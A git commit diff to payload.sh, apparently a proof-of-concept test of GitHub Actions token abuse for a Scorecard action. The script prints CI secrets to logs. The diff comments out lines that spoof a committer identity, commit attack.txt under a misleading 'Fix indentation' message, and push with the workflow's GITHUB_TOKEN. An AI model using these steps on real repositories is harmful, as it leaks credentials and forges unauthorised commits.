657e13145f75a03279d735137543a83d8a49dd13
laurentsimon <laurentsimon@google.com>
2022-06-07 00:55:43 +0000

    update

--- payload.sh
+++ payload.sh
@@ -6,14 +6,15 @@ echo "THE_TOKEN: $THE_TOKEN"
 echo "GITHUB_TOKEN: $GITHUB_TOKEN"
 # export GH_TOKEN="$GITHUB_TOKEN"
 # gh repo clone "$GITHUB_REPOSITORY"
-git clone https://github.com/laurentsimon/scorecard-action-test-2.git
-cd scorecard-action-test-2
 
-git config user.name azeemsgoogle
-git config user.email azeems@google.com
+# git clone https://github.com/laurentsimon/scorecard-action-test-2.git
+# cd scorecard-action-test-2
 
-DATE=$(date)
-echo "$DATE" >> attack.txt
-git add attack.txt
-git commit -m "Fix indentation: $DATE"
-git push https://$GITHUB_TOKEN@github.com/laurentsimon/scorecard-action-test-2.git
+# git config user.name azeemsgoogle
+# git config user.email azeems@google.com
+
+# DATE=$(date)
+# echo "$DATE" >> attack.txt
+# git add attack.txt
+# git commit -m "Fix indentation: $DATE"
+# git push https://$GITHUB_TOKEN@github.com/laurentsimon/scorecard-action-test-2.git
